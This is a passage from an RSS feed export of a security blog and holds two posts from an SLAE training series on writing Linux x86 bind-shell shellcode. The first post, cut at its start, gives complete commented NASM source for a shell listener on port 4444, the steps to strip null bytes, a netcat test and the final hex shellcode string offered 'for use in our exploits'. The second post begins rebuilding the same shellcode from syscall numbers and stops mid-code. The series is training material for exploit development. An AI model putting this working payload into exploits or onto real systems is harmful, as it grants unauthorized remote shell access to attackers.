80480ef:	89 d3                	mov    ebx,edx
80480f1:	31 c9                	xor    ecx,ecx
80480f3:	cd 80                	int    0x80
80480f5:	31 c0                	xor    eax,eax
80480f7:	b8 3f 00 00 00       	mov    eax,0x3f
80480fc:	41                   	inc    ecx
80480fd:	cd 80                	int    0x80
80480ff:	31 c0                	xor    eax,eax
8048101:	b8 3f 00 00 00       	mov    eax,0x3f
8048106:	41                   	inc    ecx
8048107:	cd 80                	int    0x80
8048109:	31 c9                	xor    ecx,ecx
804810b:	51                   	push   ecx
804810c:	68 2f 2f 73 68       	push   0x68732f2f
8048111:	68 2f 62 69 6e       	push   0x6e69622f
8048116:	89 e3                	mov    ebx,esp
8048118:	89 ca                	mov    edx,ecx
804811a:	31 c0                	xor    eax,eax
804811c:	b8 0b 00 00 00       	mov    eax,0xb
8048121:	cd 80                	int    0x80
</code></pre><pre><code>
From this we can see the problematic instructions:

```objdump
8048084:	b8 66 00 00 00       	mov    eax,0x66
8048089:	bb 01 00 00 00       	mov    ebx,0x1
80480af:	b8 66 00 00 00       	mov    eax,0x66
80480b4:	bb 02 00 00 00       	mov    ebx,0x2
80480c3:	b8 66 00 00 00       	mov    eax,0x66
80480ca:	bb 04 00 00 00       	mov    ebx,0x4
80480d8:	b8 66 00 00 00       	mov    eax,0x66
80480df:	bb 05 00 00 00       	mov    ebx,0x5
80480ea:	b8 3f 00 00 00       	mov    eax,0x3f
80480f7:	b8 3f 00 00 00       	mov    eax,0x3f
8048101:	b8 3f 00 00 00       	mov    eax,0x3f
804811c:	b8 0b 00 00 00       	mov    eax,0xb
</code></pre><p>Lets break this down and tackle these one at a time. Firstly, we&rsquo;ll deal with our <code>eax</code> <code>syscall</code> values:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">b8 66 00 00 00       	mov    eax,0x66
</code></pre></div><p>We can see that upon assembling, the compiler converted 102 to it&rsquo;s hex value of 0x66. Seeing as this is a single byte, maybe we can write it to just <code>al</code> (the smallest byte of eax) instead of the whole eax register.</p>
<p>Metasploit has a great tool for this that can help you quickly find the values of assembly instructions called <a href="https://github.com/jjyg/metasm">metasm</a>.</p>
<p>Note: If you do not have Metasploit installed, please follow the installation instructions provided by <a href="https://community.rapid7.com/docs/DOC-2100">Rapid7</a> or one of many great tutorials about installing Metasploit like this one from <a href="http://www.darkoperator.com/installing-metasploit-in-ubunt/">Carlos Perez</a> (<a href="https://twitter.com/Carlos_Perez">@darkoperator</a>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">/opt/metasploit-framework/tools/metasm_shell.rb
</code></pre></div><p>Test the following instructions and see which ones return results with no null bytes:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">mov eax, 0x66
mov ax, 0x66
mov al, 0x66
</code></pre></div><p><img src="https://i.imgur.com/ZmnEx3E.png" alt=""></p>
<p>If we look at these results, the only one that is going to work for us is <code>mov al, 0x66</code>.</p>
<p>Repeat this procedure for all the <code>mov eax, $$$</code> instructions:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">mov eax, 120     =&gt;  mov al, 0x66
mov eax, 63      =&gt;  mov al, 0x3f
mov eax, 11      =&gt;  mov al, 0xb
</code></pre></div><p>Update these lines with the updated instructions into your code.</p>
<p>We can use the same procedure for the <code>ebx</code> registers by changing them to the <code>bl</code> register.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">mov ebx, 1       =&gt;  mov bl, 0x1
mov ebx, 2       =&gt;  mov bl, 0x2
mov ebx, 4       =&gt;  mov bl, 0x4
mov ebx, 5       =&gt;  mov bl, 0x5
</code></pre></div><p>Take a look at your new assembly code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#66d9ef">global</span> _start			

<span style="color:#66d9ef">section</span> .text
_start:

		<span style="color:#75715e">; Start of our shellcode</span>

		<span style="color:#75715e">; sys_socket (creating a socket for our connection)</span>

		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax </span>
		<span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear the value of ebx </span>
		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x66</span>       <span style="color:#75715e">; set eax to 102 (sys_socketcall)</span>
		<span style="color:#a6e22e">mov</span> bl, <span style="color:#ae81ff">0x1</span>        <span style="color:#75715e">; set ebx to 1 (sys_socket)</span>
		<span style="color:#a6e22e">xor</span> ecx, ecx       <span style="color:#75715e">; clear the value of ecx</span>
		<span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push a null onto the stack (IPPROTO_IP = 0)</span>
		<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">1</span>             <span style="color:#75715e">; push a 1 to the stack (SOCK_STREAM = 1)</span>
		<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">2</span>             <span style="color:#75715e">; push a 2 to the stack (AF_INET = 2)</span>
		<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; push the location of our arguments into ecx</span>
		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_socket</span>
		<span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the returned value to edx (socket file descriptor)</span>

		<span style="color:#75715e">; sys_bind (bind a port number to our socket)</span>

		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax</span>
		<span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push eax to the stack as it&#39;s null (INADDR_ANY = 0)</span>
		<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">0x5C11</span>   <span style="color:#75715e">; push our port number to the stack (Port = 4444)</span>
		<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">2</span>        <span style="color:#75715e">; push protocol argument to the stack (AF_INET = 2)</span>
		<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; mov value of esp into ecx, the location of our sockaddr arguments</span>
		<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">16</span>            <span style="color:#75715e">; push addrlen to stack (addrlen = 16)</span>
		<span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push ecx to stack (ecx = location of our sockaddr arguments)</span>
		<span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push edx (sockfd value stored in edx)</span>
		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
		<span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x66</span>       <span style="color:#75715e">; move value of 102 into eax (sys_sockcall = 102)</span>
		<span style="color:#a6e22e">mov</span> bl, <span style="color:#ae81ff">0x2</span>        <span style="color:#75715e">; move value of 2 into eax (sys_bind = 2)</span>
		<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the arguments into ecx</span>
		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_bind</span>

		<span style="color:#75715e">; sys_listen (listen on our created socket)</span>

		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax </span>
		<span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push backlog argument to stack (backlog = 0)</span>
		<span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
		<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; store the location of our arguments into ecx</span>
		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x66</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
		<span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx to 0</span>
		<span style="color:#a6e22e">mov</span> bl, <span style="color:#ae81ff">0x4</span>        <span style="color:#75715e">; sets the value 4 which is the value for &#34;listen&#34; in sys_socketcall</span>
		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_listen</span>

		<span style="color:#75715e">; sys_accept (accept connections on our created port)</span>

		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
		<span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addrlen argument to stack (addrlen = 0)</span>
		<span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addr argument to stack (addr = 0)</span>
		<span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
		<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the location of our arguments into ecx</span>
		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x66</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
		<span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
		<span style="color:#a6e22e">mov</span> bl, <span style="color:#ae81ff">0x5</span>        <span style="color:#75715e">; sets the value 5 which is the value for sys_accept</span>
		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_accept</span>
		<span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the return value from sys_accept to edx (client file descriptor)</span>

		<span style="color:#75715e">; sys_dup2 (create file descriptors for stdin, stdout and stderr so we can see the responses from execve)</span>

		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x3f</span>       <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
		<span style="color:#a6e22e">mov</span> ebx, edx       <span style="color:#75715e">; move the stored oldfd argument to ebx (stored in edx)</span>
		<span style="color:#a6e22e">xor</span> ecx, ecx       <span style="color:#75715e">; set ecx to 0 for stdin</span>
		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_dup2</span>
		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x3f</span>       <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
		<span style="color:#a6e22e">inc</span> ecx            <span style="color:#75715e">; increment ecx to 1 for stdout</span>
		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_dup2</span>
		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x3f</span>       <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
		<span style="color:#a6e22e">inc</span> ecx            <span style="color:#75715e">; increment ecx to 2 for stderr</span>
		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_dup2</span>

		<span style="color:#75715e">; sys_execve (execute /bin//sh upon connecting and pass the responses back to connector)</span>

		<span style="color:#a6e22e">xor</span> ecx, ecx       <span style="color:#75715e">; clear value of ecx, args argument = 0</span>
		<span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push a null to the stack to terminate our filename</span>
		<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x68732f2f</span>    <span style="color:#75715e">; push //sh to the stack (second part of /bin//sh)</span>
		<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x6e69622f</span>    <span style="color:#75715e">; push /bin to the stack (first part of /bin//sh</span>
		<span style="color:#a6e22e">mov</span> ebx, esp       <span style="color:#75715e">; set ebx with the location of our file name on the stack</span>
		<span style="color:#a6e22e">mov</span> edx, ecx       <span style="color:#75715e">; move null value for envp argument into edx</span>
		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0xb</span>        <span style="color:#75715e">; sets the value 11 which is the syscall number for sys_execve</span>
		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_execve</span>
</code></pre></div><p>Lets look at the shellcode in objdump if we have any null bytes:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">objdump -D bindshell -M intel | grep <span style="color:#ae81ff">00</span>
</code></pre></div><p>Great, lets check for other known bad characters such as <code>\x0a</code> and <code>\x0d</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">objdump -D bindshell -M intel | grep 0a
objdump -D bindshell -M intel | grep 0d
</code></pre></div><p>Awesome, none of those are in our shell so lets test and see if it still works.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./bindshell
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">netstat -antp
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nc -nv 127.0.0.1 <span style="color:#ae81ff">4444</span>
id
</code></pre></div><p><img src="https://i.imgur.com/EOg9Ii6.png" alt=""></p>
<p>Our clean shell is still working.</p>
<p>Last step is to dump this for use in our exploits:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./getshell.sh bindshell
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89
\xc2\x31\xc0\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x31\xc0\x31
\xdb\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x31\xc0\x50\x52\x89\xe1\xb0\x66\x31\xdb\xb3
\x04\xcd\x80\x31\xc0\x50\x50\x52\x89\xe1\xb0\x66\x31\xdb\xb3\x05\xcd\x80\x89\xc2
\x31\xc0\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\xb0
\x3f\x41\xcd\x80\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89
\xca\x31\xc0\xb0\x0b\xcd\x80
</code></pre></div><p>This concludes this training on shellcode writing in assembly. If you just follow the steps and do research, anything is possible. My goal when starting this post was to make shellcode less intimidating and if you feel that you have walked away after reading this with a better understanding of how shellcode interacts with the system then I am satisfied.</p>
<p>I hope to create more posts as I head further down this SLAE and I recommend that anyone who is in the information security field take the course and let Vivek turn you into a shellcode ninja.</p>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>part 2: building the shellcode</title>
            <link>https://www.pwnd.red/posts/part-2-building-the-shellcode/</link>
            <pubDate>Thu, 24 Apr 2014 12:00:06 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/part-2-building-the-shellcode/</guid>
            <description>In Part 1: Disassembling and Understanding Shellcode we disassembled some shellcode and found out the steps required to create a bind shell. In Part 2, we will take each of these 6 steps, understand them and write assembly instructions to call them.
The steps we need to follow to create our bind shell are:
 Socket Bind Listen Accept Dup2 Execve  We are going to spend a lot of time working with NASM (The Netwide Assembler).</description>
            <content type="html"><![CDATA[<p>In <a href="/posts/part-1-disassembling-and-understanding-shellcode/">Part 1: Disassembling and Understanding Shellcode</a> we disassembled some shellcode and found out the steps required to create a bind shell. In Part 2, we will take each of these 6 steps, understand them and write assembly instructions to call them.</p>
<p>The steps we need to follow to create our bind shell are:</p>
<ol>
<li>Socket</li>
<li>Bind</li>
<li>Listen</li>
<li>Accept</li>
<li>Dup2</li>
<li>Execve</li>
</ol>
<p>We are going to spend a lot of time working with <a href="http://www.nasm.us/">NASM (The Netwide Assembler)</a>. To install NASM, run the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install nasm
</code></pre></div><p>We are also going to need some kernel headers for researching the calls.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install linux-headers-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>
</code></pre></div><p>Once that is completed, create a file called <code>bindshell.nasm</code> and paste the following code into it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#66d9ef">global</span> _start

<span style="color:#66d9ef">section</span> .text
_start:

        <span style="color:#75715e">; Start of our shellcode</span>
</code></pre></div><p>That should give us enough to get started, lets start working on the first call.</p>
<p><!-- raw HTML omitted --></p>
<h1 id="step-1-socket">Step 1: Socket</h1>
<p>Calling up the <a href="http://man7.org/linux/man-pages/man2/socket.2.html">man</a> page for socket gives us the following information:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">socket() creates an endpoint for communication and returns a descriptor.
Usage:
  int socket(int domain, int type, int protocol);
</code></pre></div><p>We can see that the socket requires 3 arguments to be passed to it: </p>
<table>
<thead>
<tr>
<th>Argument</th>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Domain</td>
<td>Integer</td>
<td>The protocol family which will be used for communication</td>
</tr>
<tr>
<td>Type</td>
<td>Integer</td>
<td>The communication semantics of the socket</td>
</tr>
<tr>
<td>Protocol</td>
<td>Integer</td>
<td>The particular protocol to be used with the socket</td>
</tr>
</tbody>
</table>
<p><!-- raw HTML omitted --></p>
<p>Lets start with the <code>socket</code> call itself. Searching on Google shows that the socket is a sub function of the <code>sys_socketcall</code> system call. We&rsquo;ll first need to find out what the value of this system call is to be able to use it in our assembly code.</p>
<p>Take a look at the following header file so see what the system call value is for <code>sys_socketcall</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">less /usr/include/i386-linux-gnu/asm/unistd_32.h
</code></pre></div><p>In that file we can see the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">#define __NR_socketcall 102
</code></pre></div><p>Great, now we know our first value.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_socketcall = 102
</code></pre></div><p>However, we don&rsquo;t yet know the sub functions for the <code>sys_socketcall</code>.</p>
<p>Take a look in the <code>net.h</code> file and you&rsquo;ll find the complete list of sub calls for <code>sys_socketcall</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">less /usr/src/linux-headers-3.2.0-4-common/include/linux/net.h
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">#define SYS_SOCKET       1      /* sys_socket(2)        */
#define SYS_BIND         2      /* sys_bind(2)          */
#define SYS_CONNECT      3      /* sys_connect(2)       */
#define SYS_LISTEN       4      /* sys_listen(2)        */
#define SYS_ACCEPT       5      /* sys_accept(2)        */
#define SYS_GETSOCKNAME  6      /* sys_getsockname(2)   */
#define SYS_GETPEERNAME  7      /* sys_getpeername(2)   */
#define SYS_SOCKETPAIR   8      /* sys_socketpair(2)    */
#define SYS_SEND         9      /* sys_send(2)          */
#define SYS_RECV         10     /* sys_recv(2)          */
#define SYS_SENDTO       11     /* sys_sendto(2)        */
#define SYS_RECVFROM     12     /* sys_recvfrom(2)      */
#define SYS_SHUTDOWN     13     /* sys_shutdown(2)      */
#define SYS_SETSOCKOPT   14     /* sys_setsockopt(2)    */
#define SYS_GETSOCKOPT   15     /* sys_getsockopt(2)    */
#define SYS_SENDMSG      16     /* sys_sendmsg(2)       */
#define SYS_RECVMSG      17     /* sys_recvmsg(2)       */
#define SYS_ACCEPT4      18     /* sys_accept4(2)       */
#define SYS_RECVMMSG     19     /* sys_recvmmsg(2)      */
#define SYS_SENDMMSG     20     /* sys_sendmmsg(2)      */
</code></pre></div><p>We can see from this file that:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">socket    = 1
bind      = 2
listen    = 4
accept    = 5
</code></pre></div><p>These will be the values we are going to use for each of the different sub calls.</p>
<p>In summary we know now that the system call for <code>socket</code> is under the <code>sys_socketcall</code> system call. The value for <code>sys_socketcall</code> is <code>102</code>.</p>
<p>We also know that the value of the <code>sys_socket</code> sub function is <code>1</code>. So we can start piecing the system call together.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_socketcall[102].socket[1](domain, type, protocol)
</code></pre></div><p>Lets find the values for these arguments.</p>
<p><!-- raw HTML omitted --></p>
<h3 id="int-domain">int domain</h3>
<p>Back in the <code>man</code> page for <code>socket</code> we can see the explanation of domain as:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">The domain argument specifies a communication domain; this selects
the protocol family which will be used for communication.  These
families are defined in sys/socket.h.
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">AF_UNIX, AF_LOCAL   Local communication
AF_INET             IPv4 Internet protocols
AF_INET6            IPv6 Internet protocols
AF_IPX              IPX - Novell protocols
AF_NETLINK          Kernel user interface device
AF_X25              ITU-T X.25 / ISO-8208 protocol
AF_AX25             Amateur radio AX.25 protocol
AF_ATMPVC           Access to raw ATM PVCs
AF_APPLETALK        Appletalk
AF_PACKET           Low level packet interface
</code></pre></div><p>We&rsquo;ll be using IPv4 for our bind shell so we&rsquo;ll set our domain to <code>AF_INET</code>. To find the integer value for <code>AF_INET</code> we use more Google-Fu and we find this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">/* Supported address families. */
#define AF_UNSPEC      0
#define AF_UNIX        1     /* Unix domain sockets           */
#define AF_INET        2     /* Internet IP Protocol          */
#define AF_AX25        3     /* Amateur Radio AX.25           */
#define AF_IPX         4     /* Novell IPX                    */
#define AF_APPLETALK   5     /* Appletalk DDP                 */
#define AF_NETROM      6     /* Amateur radio NetROM          */
#define AF_BRIDGE      7     /* Multiprotocol bridge          */
#define AF_AAL5        8     /* Reserved for Werner&#39;s ATM     */
#define AF_X25         9     /* Reserved for X.25 project     */
#define AF_INET6       10    /* IP version 6                  */
</code></pre></div><p>The integer of AF_INET for our domain argument will be <code>2</code></p>
<p><!-- raw HTML omitted --></p>
<h2 id="int-type">int type</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">The socket has the indicated type, which specifies the communication
semantics.  Currently defined types are:

SOCK_STREAM     Provides sequenced, reliable, two-way, connection-
                based byte streams.  An out-of-band data transmission
                mechanism may be supported.
SOCK_DGRAM      Supports datagrams (connectionless, unreliable
                messages of a fixed maximum length).
SOCK_SEQPACKET  Provides a sequenced, reliable, two-way connection-
                based data transmission path for datagrams of fixed
                maximum length; a consumer is required to read an
                entire packet with each input system call.
SOCK_RAW        Provides raw network protocol access.
SOCK_RDM        Provides a reliable datagram layer that does not
                guarantee ordering.
SOCK_PACKET     Obsolete and should not be used in new programs; see
                packet(7).
</code></pre></div><p><code>SOCK_STREAM</code> appears top be the best choice here for our IPv4 bind shell.</p>
<p>More Google-Fu</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">/* Socket types. */
#define SOCK_STREAM       1        /* stream (connection) socket     */
#define SOCK_DGRAM        2        /* datagram (conn.less) socket    */
#define SOCK_RAW          3        /* raw socket                     */
#define SOCK_RDM          4        /* reliably-delivered message     */
#define SOCK_SEQPACKET    5        /* sequential packet socket       */
#define SOCK_PACKET       10       /* linux specific way of          */
                                   /* getting packets at the dev     */
                                   /* level.  For writing rarp and   */
                                   /* other similar things on the    */
                                   /* user level.                    */
</code></pre></div><p>Our integer of <code>SOCK_STREAM</code> for our socket type will be <code>1</code>.</p>
<p><!-- raw HTML omitted --></p>
<h2 id="int-protocol">int protocol</h2>
<p>Again, consult the <a href="http://man7.org/linux/man-pages/man2/socket.2.html">man</a> page for sockets.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">The protocol specifies a particular protocol to be used with the
socket.  Normally only a single protocol exists to support a
particular socket type within a given protocol family, in which case
protocol can be specified as 0.  However, it is possible that many
protocols may exist, in which case a particular protocol must be
specified in this manner.  The protocol number to use is specific to
the “communication domain” in which communication is to take place;
see protocols(5).
</code></pre></div><p>Find the protocol in the header file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">less /usr/src/linux-headers-3.2.0-4-common/include/linux/in.h
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">/* Standard well-defined IP protocols.  */
enum {
  IPPROTO_IP      = 0,         /* Dummy protocol for TCP                    */
  IPPROTO_ICMP    = 1,         /* Internet Control Message Protocol         */
  IPPROTO_IGMP    = 2,         /* Internet Group Management Protocol        */
  IPPROTO_IPIP    = 4,         /* IPIP tunnels (older KA9Q tunnels use 94)  */
  IPPROTO_TCP     = 6,         /* Transmission Control Protocol             */
  IPPROTO_EGP     = 8,         /* Exterior Gateway Protocol                 */
  IPPROTO_PUP     = 12,        /* PUP protocol                              */
  IPPROTO_UDP     = 17,        /* User Datagram Protocol                    */
  IPPROTO_IDP     = 22,        /* XNS IDP protocol                          */
  IPPROTO_DCCP    = 33,        /* Datagram Congestion Control Protocol      */
  IPPROTO_RSVP    = 46,        /* RSVP protocol                             */
  IPPROTO_GRE     = 47,        /* Cisco GRE tunnels (rfc 1701,1702)         */
  IPPROTO_IPV6    = 41,        /* IPv6-in-IPv4 tunnelling                   */
  IPPROTO_ESP     = 50,        /* Encapsulation Security Payload protocol   */
  IPPROTO_AH      = 51,        /* Authentication Header protocol            */
  IPPROTO_BEETPH  = 94,        /* IP option pseudo header for BEET          */
  IPPROTO_PIM     = 103,       /* Protocol Independent Multicast            */
  IPPROTO_COMP    = 108,       /* Compression Header protocol               */
  IPPROTO_SCTP    = 132,       /* Stream Control Transport Protocol         */
  IPPROTO_UDPLITE = 136,       /* UDP-Lite (RFC 3828)                       */
  IPPROTO_RAW     = 255,       /* Raw IP packets                            */
  IPPROTO_MAX
};
</code></pre></div><p>For our IPv4 bind shell the best choice would be <code>IPPROTO_IP</code> which has the value of <code>0</code>.</p>
<p>If we add these new parameters to the socket call, we get the following call.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_socketcall[102 =&gt; eax].socket[1 =&gt; ebx](2, 1, 0 =&gt; ecx)
</code></pre></div><p>Seems simple enough, lets get these values into the registers.</p>
<p>Open up the <code>bindshell.nasm</code> file and start creating our assembly code.</p>
<p>First, we need to clear out any values that may exist in eax or ebx. We can do this by xoring the register with itself. We&rsquo;ll also add comments to the shellcode as we go so we know what we are doing.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#66d9ef">global</span> _start            

<span style="color:#66d9ef">section</span> .text
_start:

        <span style="color:#75715e">; Start of our shellcode</span>
        <span style="color:#75715e">; sys_socket (creating a socket for our connection)</span>

